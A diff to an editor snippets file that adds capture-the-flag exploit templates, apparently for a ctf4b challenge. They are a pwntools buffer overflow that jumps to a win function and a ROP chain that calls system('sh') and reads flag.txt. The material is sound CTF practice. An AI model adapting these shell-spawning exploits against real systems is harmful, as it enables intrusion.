@@ -246,3 +246,83 @@ def jacobi_symbol(a, n):
         j = 0
     return j
 endsnippet
+
+snippet ctf_bof_sample "BOFサンプル" b
+from pwn import *
+import os
+
+context.log_level = 'critical'
+HOST = '0.0.0.0'
+PORT = 9000
+io = remote(HOST, PORT)
+
+binfile = './chall'
+e = ELF(binfile)
+context.binary = binfile
+
+print(hex(e.sym['win']), pack(e.sym['win']))
+
+pad = b'a' * 0x28
+
+payload = pad + pack(e.sym['win'])
+print(payload)
+
+io.sendlineafter(b'name?', str(100).encode())
+io.sendlineafter(b'name?', payload)
+
+a = io.recvuntil(b'ctf4b')
+print(a)
+print('ctf4b' + io.readline().decode(), end='')
+endsnippet
+
+snippet ctf_remote "remote接続のサンプル" b
+context.log_level = 'critical'
+HOST = '0.0.0.0'
+PORT = 9000
+io = remote(HOST, PORT)
+endsnippet
+snippet ctf_rop_sample "ROPのサンプル" b
+from pwn import *
+import os
+#!/usr/bin/env python3
+from pwn import *
+import os
+
+HOST = os.getenv('CTF4B_HOST', '0.0.0.0')
+PORT = int(os.getenv('CTF4B_PORT', '9001'))
+
+context.log_level = 'critical'
+binfile = './chall'
+e = ELF(binfile)
+context.binary = binfile
+
+io = remote(HOST, PORT)
+
+pad = b'a' * 0x18
+
+rop = ROP(e)
+# helpをみるとsystemは引数にrdiをとるので，
+# rdiに"sh"をいれたい
+# pop rdi; retのならびの場所を探す
+rop.raw(rop.find_gadget(['pop rdi', 'ret']))
+# pop rdi; retの場所にretすることになるので，
+# rdiに入れる値を挿入する
+# rdiに'sh\0'を
+rop.raw(pack(next(e.search(b'sh\0'))))
+# rop.raw(pack(0x00000000004020f4))
+# 最後にsystemを読んで上げれば良い!!
+rop.raw(pack(e.sym['help']+0xf)) # system()
+
+payload = pad + rop.chain()
+print(payload)
+
+assert(len(payload) <= 0x30)
+
+io.sendlineafter(b'?', payload)
+
+io.sendline(b'echo exploited')
+io.sendlineafter(b'exploited\n', b'cat flag.txt')
+
+print(io.readline().decode('utf-8', 'ignore'), end='')
+print('ctf4b' + io.readline().decode(), end='')
+endsnippet
